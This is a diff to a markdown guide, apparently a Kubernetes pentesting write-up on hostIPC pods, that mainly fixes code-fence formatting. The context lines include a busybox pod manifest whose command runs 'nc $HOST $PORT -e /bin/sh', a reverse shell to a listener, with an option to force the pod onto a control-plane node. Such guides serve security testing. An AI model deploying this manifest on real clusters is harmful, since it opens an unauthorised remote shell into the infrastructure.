@@ -19,7 +19,8 @@ spec:
     command: [ "/bin/sh", "-c", "--" ]
     args: [ "while true; do sleep 30; done;" ]
     name: hostipc
-    #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  ```
+  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name
+```
 [pod-hostipc.yaml](pod-hostipc.yaml)
 
 #### Option 1: Create pod from local yaml 
@@ -51,8 +52,10 @@ spec:
   - image: busybox
     command: [ "/bin/sh", "-c", "--" ]
     args: [ "nc $HOST $PORT  -e /bin/sh;" ]
-    name: hostipc--revshell
-    #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name```
+    name: hostipc--revshell    
+  restartPolicy: Always
+  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+```
 [pod-hostipc-revshell.yaml](pod-hostipc-revshell.yaml)
 
 #### Set up listener
